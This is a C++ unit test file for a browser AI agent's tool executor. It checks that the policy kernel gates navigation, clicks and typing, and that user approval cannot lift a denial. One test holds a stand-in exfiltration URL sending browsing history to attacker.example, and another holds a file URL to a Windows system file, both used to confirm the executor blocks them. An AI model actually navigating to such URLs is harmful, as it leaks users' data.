// Copyright 2026 The Zephyrus Authors
// Use of this source code is governed by a BSD-style license that can be
// found in the LICENSE file.

// The executor against the real kernel, with a fake browser underneath.
//
// The kernel is the genuine AgentKernelService bound over an in-process pipe,
// not a stub. A stubbed kernel would let these tests pass against rules nobody
// ships, and the property most worth testing here is precisely that the
// executor cannot act without the real policy agreeing.

#include "chrome/browser/zephyrus/agent/tool_executor.h"

#include <memory>
#include <string>
#include <utility>
#include <vector>

#include "base/run_loop.h"
#include "base/test/bind.h"
#include "base/test/task_environment.h"
#include "chrome/browser/zephyrus/agent/agent_kernel_client.h"
#include "chrome/browser/zephyrus/agent/observation.h"
#include "chrome/browser/zephyrus/agent/tool_surface.h"
#include "chrome/services/zephyrus_agent/agent_kernel_service.h"
#include "mojo/public/cpp/bindings/pending_remote.h"
#include "testing/gtest/include/gtest/gtest.h"
#include "ui/accessibility/ax_tree_id.h"
#include "url/gurl.h"

namespace zephyrus::agent {
namespace {

using Status = ToolExecutor::Result::Status;

ObservedNode Node(const std::string& id,
                  const std::string& role,
                  const std::string& name,
                  ui::AXNodeID ax_id) {
  ObservedNode node;
  node.id = id;
  node.role = role;
  node.name = name;
  node.ax_id = ax_id;
  return node;
}

// Records what the executor asked the browser to do, and lets a test make any
// of it fail the way a real browser would when the world has moved.
class FakeToolSurface : public ToolSurface {
 public:
  FakeToolSurface() {
    page_tree_id = ui::AXTreeID::CreateNewAXTreeID();
    live_tree_id = page_tree_id;
  }

  std::string GetActiveUrl() override { return active_url; }
  std::vector<TabInfo> ListTabs() override { return tabs; }

  bool Navigate(const GURL& url) override {
    navigated_to = url;
    return true;
  }
  bool GoBack() override {
    went_back = true;
    return can_go_back;
  }
  bool GoForward() override { return false; }
  bool Reload() override { return true; }
  bool OpenTab(const GURL& url) override {
    opened = url;
    return true;
  }
  bool SwitchToTab(int tab_id) override { return HasTab(tab_id); }
  bool CloseTab(int tab_id) override { return HasTab(tab_id); }

  void Observe(ObserveCallback callback) override {
    ++observe_count;
    Observation observation;
    observation.url = active_url;
    observation.title = page_title;
    observation.text = page_text;
    observation.tree_id = page_tree_id;
    observation.elements = page_elements;
    std::move(callback).Run(std::move(observation));
  }

  ui::AXTreeID CurrentTreeId() override { return live_tree_id; }

  bool ClickNode(const ObservedNode& node) override {
    clicked = node.ax_id;
    return true;
  }
  bool TypeIntoNode(const ObservedNode& node,
                    const std::string& text) override {
    filled = node.ax_id;
    filled_with = text;
    typed = true;
    // A real browser cannot promise the text arrived, so neither does this.
    // When `typing_silently_fails` is set the call still reports success and
    // the page is left unchanged -- which is exactly the shape of the bug the
    // verification exists to catch.
    if (!typing_silently_fails) {
      for (ObservedNode& element : page_elements) {
        if (element.ax_id == node.ax_id) {
          element.value = text;
        }
      }
    }
    return true;
  }
  bool SetNodeValue(const ObservedNode& node,
                    const std::string& value) override {
    filled = node.ax_id;
    filled_with = value;
    // Same as TypeIntoNode: model a browser where the value actually lands,
    // because the executor now looks again to check that it did.
    if (!typing_silently_fails) {
      for (ObservedNode& element : page_elements) {
        if (element.ax_id == node.ax_id) {
          element.value = value;
        }
      }
    }
    return true;
  }
  bool ScrollPage(bool down, const std::string& amount) override {
    scrolled_down = down;
    return true;
  }
  bool PressKey(const std::string& key) override {
    pressed = key;
    return true;
  }
  std::string ReadSelection() override { return "some selected words"; }

  bool HasTab(int id) const {
    for (const TabInfo& tab : tabs) {
      if (tab.id == id) {
        return true;
      }
    }
    return false;
  }

  std::string active_url = "https://docs.example.com/laptops/x1";
  std::string page_title = "Laptop X1";
  std::string page_text = "Specifications for the X1.";
  std::vector<TabInfo> tabs = {{1, "Guide", "https://docs.example.com/g", true},
                               {2, "Inbox", "https://mail.example.com/", false}};
  std::vector<ObservedNode> page_elements = {
      Node("e1", "link", "Specifications", 11),
      Node("e2", "button", "Send to a friend", 12),
      Node("e3", "textbox", "Search", 13),
      Node("e4", "password", "Password", 14)};
  bool can_go_back = true;

  // The tree an Observation is taken from, and the tree the page is showing
  // now. A test makes them differ to mean "the page moved on".
  ui::AXTreeID page_tree_id;
  ui::AXTreeID live_tree_id;

  int observe_count = 0;
  GURL navigated_to;
  GURL opened;
  bool went_back = false;
  bool scrolled_down = false;
  ui::AXNodeID clicked = ui::kInvalidAXNodeID;
  ui::AXNodeID filled = ui::kInvalidAXNodeID;
  // True when the text went through the typing path rather than being
  // assigned. page.type must type; page.select must not.
  bool typed = false;
  bool typing_silently_fails = false;
  std::string filled_with;
  std::string pressed;
};

class ToolExecutorTest : public testing::Test {
 public:
  ToolExecutorTest() {
    mojo::PendingRemote<mojom::AgentKernel> remote;
    service_ = std::make_unique<AgentKernelService>(
        remote.InitWithNewPipeAndPassReceiver());
    client_ = std::make_unique<AgentKernelClient>(std::move(remote));
    executor_ = std::make_unique<ToolExecutor>(client_.get(), &surface_);
  }

 protected:
  ToolExecutor::Result Run(const std::string& tool,
                           const std::string& arguments_json,
                           const std::string& task = "Find the spec sheet") {
    ToolExecutor::Result result;
    base::RunLoop run_loop;
    executor_->Execute(tool, arguments_json, task,
                       base::BindLambdaForTesting([&](ToolExecutor::Result got) {
                         result = std::move(got);
                         run_loop.Quit();
                       }));
    run_loop.Run();
    return result;
  }

  // Most element tests need the page to have been looked at first, which is
  // exactly the sequence the tool contract describes.
  void ObserveFirst() {
    ASSERT_EQ(Run("page.observe", R"({"level":1})").status, Status::kOk);
  }

  base::test::TaskEnvironment task_environment_;
  FakeToolSurface surface_;
  std::unique_ptr<AgentKernelService> service_;
  std::unique_ptr<AgentKernelClient> client_;
  std::unique_ptr<ToolExecutor> executor_;
};

// --- the ordinary path --------------------------------------------------

TEST_F(ToolExecutorTest, RunsAnAllowedNavigation) {
  ToolExecutor::Result result =
      Run("browser.navigate", R"({"url":"https://en.wikipedia.org/wiki/TDP"})");
  EXPECT_EQ(result.status, Status::kOk);
  EXPECT_EQ(result.risk, "R1");
  EXPECT_EQ(surface_.navigated_to, GURL("https://en.wikipedia.org/wiki/TDP"));
}

TEST_F(ToolExecutorTest, RunsAnAllowedHistoryMove) {
  EXPECT_EQ(Run("browser.back", "{}").status, Status::kOk);
  EXPECT_TRUE(surface_.went_back);
}

TEST_F(ToolExecutorTest, ReturnsTheTabListAsJsonForTheModel) {
  ToolExecutor::Result result = Run("tabs.list", "{}");
  ASSERT_EQ(result.status, Status::kOk);
  EXPECT_EQ(result.risk, "R0");
  EXPECT_NE(result.value_json.find("\"id\":2"), std::string::npos)
      << result.value_json;
}

TEST_F(ToolExecutorTest, CarriesTheAnswerBackFromTaskComplete) {
  ToolExecutor::Result result = Run("task.complete", R"({"answer":"4.2.1"})");
  ASSERT_EQ(result.status, Status::kOk);
  EXPECT_NE(result.value_json.find("4.2.1"), std::string::npos);
}

// --- the observation pipeline -------------------------------------------

TEST_F(ToolExecutorTest, ObservingReportsThePageToTheModel) {
  ToolExecutor::Result result = Run("page.observe", R"({"level":1})");
  ASSERT_EQ(result.status, Status::kOk);
  EXPECT_EQ(result.risk, "R0");
  EXPECT_NE(result.value_json.find("Specifications"), std::string::npos)
      << result.value_json;
  EXPECT_NE(result.value_json.find("\"id\":\"e1\""), std::string::npos)
      << result.value_json;
}

TEST_F(ToolExecutorTest, ObservingAtLevelZeroLeavesElementsOut) {
  ToolExecutor::Result result = Run("page.observe", R"({"level":0})");
  ASSERT_EQ(result.status, Status::kOk);
  EXPECT_EQ(result.value_json.find("elements"), std::string::npos)
      << result.value_json;
  EXPECT_NE(result.value_json.find("Laptop X1"), std::string::npos);
}

TEST_F(ToolExecutorTest, FindingFiltersTheElements) {
  ToolExecutor::Result result = Run("page.find", R"({"query":"search"})");
  ASSERT_EQ(result.status, Status::kOk);
  EXPECT_NE(result.value_json.find("\"e3\""), std::string::npos)
      << result.value_json;
  EXPECT_EQ(result.value_json.find("Specifications"), std::string::npos)
      << result.value_json;
}

TEST_F(ToolExecutorTest, ClicksAnElementItWasShown) {
  ObserveFirst();
  ToolExecutor::Result result = Run("page.click", R"({"element_id":"e1"})");
  EXPECT_EQ(result.status, Status::kOk) << result.message;
  EXPECT_EQ(surface_.clicked, 11);
}

TEST_F(ToolExecutorTest, TypesIntoAnElementItWasShown) {
  ObserveFirst();
  ToolExecutor::Result result =
      Run("page.type", R"({"element_id":"e3","text":"thermal throttling"})");
  EXPECT_EQ(result.status, Status::kOk) << result.message;
  EXPECT_EQ(surface_.filled, 13);
  EXPECT_EQ(surface_.filled_with, "thermal throttling");
}

TEST_F(ToolExecutorTest, AnElementIdIsUselessBeforeAnythingHasLooked) {
  // Nothing has observed, so the executor is holding no ids, so the kernel has
  // nothing to ground against and refuses. The model has to look first, which
  // is what the tool contract tells it to do.
  ToolExecutor::Result result = Run("page.click", R"({"element_id":"e1"})");
  EXPECT_EQ(result.status, Status::kDenied);
  EXPECT_EQ(surface_.clicked, ui::kInvalidAXNodeID);
}

TEST_F(ToolExecutorTest, IdsExpireWhenThePageIsReplaced) {
  ObserveFirst();
  // Same id, different page. Acting on whatever holds "e1" in the new tree
  // would be acting on an element nobody was shown.
  surface_.live_tree_id = ui::AXTreeID::CreateNewAXTreeID();

  ToolExecutor::Result result = Run("page.click", R"({"element_id":"e1"})");
  EXPECT_EQ(result.status, Status::kFailed);
  EXPECT_EQ(result.message, "the page has changed since it was last looked at");
  EXPECT_EQ(surface_.clicked, ui::kInvalidAXNodeID);
}

TEST_F(ToolExecutorTest, ObservingAgainReplacesTheOldIds) {
  ObserveFirst();
  // The page now offers one different control. e2 was real a moment ago and is
  // not any more; nothing has to remember to invalidate it.
  surface_.page_elements = {Node("e1", "button", "Continue", 21)};
  ObserveFirst();

  ToolExecutor::Result result = Run("page.click", R"({"element_id":"e2"})");
  EXPECT_EQ(result.status, Status::kDenied);
  EXPECT_EQ(surface_.clicked, ui::kInvalidAXNodeID);
}

TEST_F(ToolExecutorTest, ScrollingAndKeysNeedNoElement) {
  EXPECT_EQ(Run("page.scroll", R"({"direction":"down","amount":"page"})").status,
            Status::kOk);
  EXPECT_TRUE(surface_.scrolled_down);
  EXPECT_EQ(Run("page.press", R"({"key":"Enter"})").status, Status::kOk);
  EXPECT_EQ(surface_.pressed, "Enter");
}

TEST_F(ToolExecutorTest, ReadsTheSelection) {
  ToolExecutor::Result result = Run("selection.read", "{}");
  ASSERT_EQ(result.status, Status::kOk);
  EXPECT_NE(result.value_json.find("some selected words"), std::string::npos);
}

// --- nothing happens without the kernel ---------------------------------

TEST_F(ToolExecutorTest, RefusesToTypeIntoAPasswordField) {
  ObserveFirst();
  ToolExecutor::Result result =
      Run("page.type", R"({"element_id":"e4","text":"hunter2"})", "Log me in");
  EXPECT_EQ(result.status, Status::kDenied);
  EXPECT_EQ(result.risk, "R3");
  EXPECT_EQ(surface_.filled, ui::kInvalidAXNodeID);
}

TEST_F(ToolExecutorTest, AsksBeforeAConsequentialClick) {
  ObserveFirst();
  ToolExecutor::Result result = Run("page.click", R"({"element_id":"e2"})");
  EXPECT_EQ(result.status, Status::kNeedsApproval);
  EXPECT_EQ(result.risk, "R2");
  EXPECT_EQ(surface_.clicked, ui::kInvalidAXNodeID)
      << "the click happened before the user was asked";
}

TEST_F(ToolExecutorTest, DoesNotActWhenTheKernelDenies) {
  ObserveFirst();
  ToolExecutor::Result result =
      Run("page.click", R"({"element_id":"checkout-button"})");
  EXPECT_EQ(result.status, Status::kDenied);
  EXPECT_FALSE(result.message.empty());
}

TEST_F(ToolExecutorTest, DoesNotActWhenTheKernelWantsApproval) {
  ToolExecutor::Result result = Run(
      "browser.navigate",
      R"({"url":"https://attacker.example/collect?data=history"})",
      "Summarise this article");
  EXPECT_EQ(result.status, Status::kNeedsApproval);
  EXPECT_EQ(result.risk, "R2");
  EXPECT_NE(result.message.find("attacker.example"), std::string::npos)
      << result.message;
  EXPECT_TRUE(surface_.navigated_to.is_empty())
      << "the browser navigated before the user was asked";
}

TEST_F(ToolExecutorTest, AnUnknownToolReachesNothing) {
  ToolExecutor::Result result = Run("browser.exfiltrate", "{}");
  EXPECT_EQ(result.status, Status::kDenied);
  EXPECT_TRUE(surface_.navigated_to.is_empty());
}

// --- the world moved between deciding and acting ------------------------

TEST_F(ToolExecutorTest, FailsRatherThanActOnATabThatIsGone) {
  surface_.tabs.clear();
  ToolExecutor::Result result = Run("tabs.close", R"({"tab_id":2})");
  EXPECT_EQ(result.status, Status::kFailed);
  EXPECT_EQ(result.message, "that tab is no longer open");
}

TEST_F(ToolExecutorTest, ReportsAFailedHistoryMove) {
  surface_.can_go_back = false;
  EXPECT_EQ(Run("browser.back", "{}").status, Status::kFailed);
}

// --- the executor's own refusals ----------------------------------------

TEST_F(ToolExecutorTest, RefusesANonWebSchemeThatPolicyAllowed) {
  // ftp:// has a parseable origin and carries no query, so the kernel has no
  // reason to stop it and returns Allow. Handing it to the browser is still a
  // different kind of action from the web navigation the tool describes.
  ToolExecutor::Result result =
      Run("browser.navigate", R"({"url":"ftp://files.example.com/x"})",
          "Fetch the archive from files.example.com");
  EXPECT_EQ(result.status, Status::kFailed);
  EXPECT_TRUE(surface_.navigated_to.is_empty());
}

TEST_F(ToolExecutorTest, ThePolicyAlsoCatchesAFileUrl) {
  // Written expecting the executor to be the thing that stopped this, and it
  // never got the chance: the kernel cannot parse an origin out of a file URL
  // and its parser fails closed, so this comes back as Ask. Both layers cover
  // it, which is the point of having both.
  ToolExecutor::Result result =
      Run("browser.navigate", R"({"url":"file:///C:/Windows/win.ini"})",
          "Open file:///C:/Windows/win.ini");
  EXPECT_EQ(result.status, Status::kNeedsApproval);
  EXPECT_TRUE(surface_.navigated_to.is_empty());
}

// --- the callback contract ----------------------------------------------

TEST_F(ToolExecutorTest, AnswersEvenIfTheExecutorIsDestroyedFirst) {
  // An agent loop waiting on a reply that never comes is stuck, which is worse
  // than a failure. Destroying the executor mid-decision must still answer.
  bool answered = false;
  ToolExecutor::Result result;
  executor_->Execute("tabs.list", "{}", "Find the spec sheet",
                     base::BindLambdaForTesting([&](ToolExecutor::Result got) {
                       answered = true;
                       result = std::move(got);
                     }));
  executor_.reset();
  task_environment_.RunUntilIdle();

  EXPECT_TRUE(answered);
  EXPECT_EQ(result.status, Status::kFailed);
}


// --- approval -----------------------------------------------------------

TEST_F(ToolExecutorTest, ApprovalLiftsAnAsk) {
  ObserveFirst();
  // Without approval this is the click that stops a task.
  ASSERT_EQ(Run("page.click", R"({"element_id":"e2"})").status,
            Status::kNeedsApproval);
  ASSERT_EQ(surface_.clicked, ui::kInvalidAXNodeID);

  ToolExecutor::Result result;
  base::RunLoop run_loop;
  executor_->ExecuteApproved(
      "page.click", R"({"element_id":"e2"})", "Send this to a friend",
      base::BindLambdaForTesting([&](ToolExecutor::Result got) {
        result = std::move(got);
        run_loop.Quit();
      }));
  run_loop.Run();

  EXPECT_EQ(result.status, Status::kOk) << result.message;
  EXPECT_EQ(surface_.clicked, 12);
}

TEST_F(ToolExecutorTest, ApprovalDoesNotLiftADeny) {
  // The property worth having. A denial is not a question, so approving it is
  // not an answer -- and a user clicking through prompts must not be able to
  // turn one into the other.
  ObserveFirst();

  ToolExecutor::Result result;
  base::RunLoop run_loop;
  executor_->ExecuteApproved(
      "page.type", R"({"element_id":"e4","text":"hunter2"})", "Log me in",
      base::BindLambdaForTesting([&](ToolExecutor::Result got) {
        result = std::move(got);
        run_loop.Quit();
      }));
  run_loop.Run();

  EXPECT_EQ(result.status, Status::kDenied);
  EXPECT_EQ(result.risk, "R3");
  EXPECT_EQ(surface_.filled, ui::kInvalidAXNodeID)
      << "an approved password field is still a password field";
}

TEST_F(ToolExecutorTest, ApprovalIsCheckedAgainstPolicyNow) {
  // The approval was given for a page that has since been replaced. Policy is
  // consulted again rather than trusted from when the question was asked, so
  // the id no longer resolves and the call is refused.
  ObserveFirst();
  surface_.page_elements = {Node("e1", "button", "Continue", 21)};
  ObserveFirst();

  ToolExecutor::Result result;
  base::RunLoop run_loop;
  executor_->ExecuteApproved(
      "page.click", R"({"element_id":"e2"})", "Send this to a friend",
      base::BindLambdaForTesting([&](ToolExecutor::Result got) {
        result = std::move(got);
        run_loop.Quit();
      }));
  run_loop.Run();

  EXPECT_EQ(result.status, Status::kDenied);
  EXPECT_EQ(surface_.clicked, ui::kInvalidAXNodeID);
}


TEST_F(ToolExecutorTest, RefusesToTypeIntoSomethingThatIsNotAField) {
  // The bug that stalled a real task on YouTube: a page can have a text field
  // and a button with the SAME accessible name -- a search box and its
  // magnifying glass are both "Search". Setting a value on the button does
  // nothing, the accessibility action reports no result, and the executor used
  // to say "ok" while the box stayed empty.
  // Two things with the SAME name, which is the shape that caused the bug.
  // The consequential-verb rule only escalates page.click, so policy allows
  // typing into a button and the executor is the one that has to notice.
  surface_.page_elements = {Node("e1", "button", "Search", 31),
                            Node("e2", "searchbox", "Search", 32)};
  ObserveFirst();

  // Naming the button now resolves to the field, because "type into Search"
  // has exactly one sensible reading when only one thing called Search holds
  // text. Refusing here cost a real run several steps and then sent it to CLICK
  // the button, which submitted an empty search and invalidated every element
  // id it was holding.
  ToolExecutor::Result on_button =
      Run("page.type", R"({"element_id":"e1","text":"sidemen"})");
  EXPECT_EQ(on_button.status, Status::kOk) << on_button.message;
  EXPECT_EQ(surface_.filled, 32) << "it did not fall through to the field";

  // The field with the same name still works.
  ToolExecutor::Result on_field =
      Run("page.type", R"({"element_id":"e2","text":"sidemen"})");
  EXPECT_EQ(on_field.status, Status::kOk) << on_field.message;
  EXPECT_EQ(surface_.filled, 32);
}

TEST_F(ToolExecutorTest, RefusesToTypeIntoAFieldScrolledOutOfView) {
  // Typing into an offscreen field is the one case that would half-work, which
  // is worse than failing. kSetValue does not care where an element is, so the
  // text would land -- but the pointer click that focuses it is skipped,
  // because the bounds of an offscreen element name the edge it went behind
  // rather than the element. The model would be told "ok" and then find that
  // Enter did nothing, with no way to learn why.
  ObservedNode below = Node("e1", "searchbox", "Search", 41);
  below.offscreen = true;
  surface_.page_elements = {below};
  ObserveFirst();

  ToolExecutor::Result result =
      Run("page.type", R"({"element_id":"e1","text":"sidemen"})");
  EXPECT_EQ(result.status, Status::kFailed);
  // The message has to name the way out, not just the problem. page.scroll
  // works, so "scroll to it first" is a step the model can actually take.
  EXPECT_NE(result.message.find("scroll"), std::string::npos)
      << result.message;
  EXPECT_EQ(surface_.filled, ui::kInvalidAXNodeID)
      << "it filled a field it could not focus";
}

TEST_F(ToolExecutorTest, TypingTypesWhileSelectingAssigns) {
  // Two tools, two mechanisms, and the difference is not cosmetic. Assigning a
  // value to a framework-built search box leaves it convinced it is empty,
  // because it watches its own key events rather than reading .value -- that is
  // what stalled a real task on YouTube. A native <select> has the opposite
  // problem: there is nothing to type into it.
  surface_.page_elements = {Node("e1", "searchbox", "Search", 51),
                            Node("e2", "combobox", "Country", 52)};
  ObserveFirst();

  ASSERT_EQ(Run("page.type", R"({"element_id":"e1","text":"sidemen"})").status,
            Status::kOk);
  EXPECT_TRUE(surface_.typed) << "page.type assigned a value instead of typing";
  EXPECT_EQ(surface_.filled_with, "sidemen");

  surface_.typed = false;
  ASSERT_EQ(Run("page.select", R"({"element_id":"e2","value":"India"})").status,
            Status::kOk);
  EXPECT_FALSE(surface_.typed) << "page.select typed instead of choosing";
  EXPECT_EQ(surface_.filled_with, "India");
}

TEST_F(ToolExecutorTest, StillRefusesWhenNothingWithThatNameTakesText) {
  // The fallback above only applies when something with the SAME name can hold
  // text. A lone button keeps its refusal, because silently retargeting to some
  // unrelated field would be the executor inventing an intention.
  surface_.page_elements = {Node("e1", "button", "Search", 61),
                            Node("e2", "searchbox", "Ask a question", 62)};
  ObserveFirst();

  ToolExecutor::Result result =
      Run("page.type", R"({"element_id":"e1","text":"sidemen"})");
  EXPECT_EQ(result.status, Status::kFailed);
  EXPECT_NE(result.message.find("button"), std::string::npos) << result.message;
  EXPECT_EQ(surface_.filled, ui::kInvalidAXNodeID)
      << "it typed into an unrelated field";
}

TEST_F(ToolExecutorTest, SaysSoWhenTypedTextDoesNotActuallyLand) {
  // The failure this exists for: the browser reports that it typed, the page is
  // unchanged, and the model is told "ok". It then presses Enter on an empty
  // box and spends the rest of its budget wondering why nothing happened. That
  // is worse than a plain failure, because it builds the next step on a lie.
  surface_.typing_silently_fails = true;
  surface_.page_elements = {Node("e1", "searchbox", "Search", 71)};
  ObserveFirst();

  ToolExecutor::Result result =
      Run("page.type", R"({"element_id":"e1","text":"sidemen"})");
  EXPECT_EQ(result.status, Status::kFailed) << result.message;
  EXPECT_NE(result.message.find("sidemen"), std::string::npos)
      << "the message does not say what was checked: " << result.message;
}

TEST_F(ToolExecutorTest, TypingThatLandsIsReportedAsSuccess) {
  // The other half. Without this the test above passes just as well with
  // verification that always fails.
  surface_.page_elements = {Node("e1", "searchbox", "Search", 72)};
  ObserveFirst();

  ToolExecutor::Result result =
      Run("page.type", R"({"element_id":"e1","text":"sidemen"})");
  EXPECT_EQ(result.status, Status::kOk) << result.message;
}

}  // namespace
}  // namespace zephyrus::agent
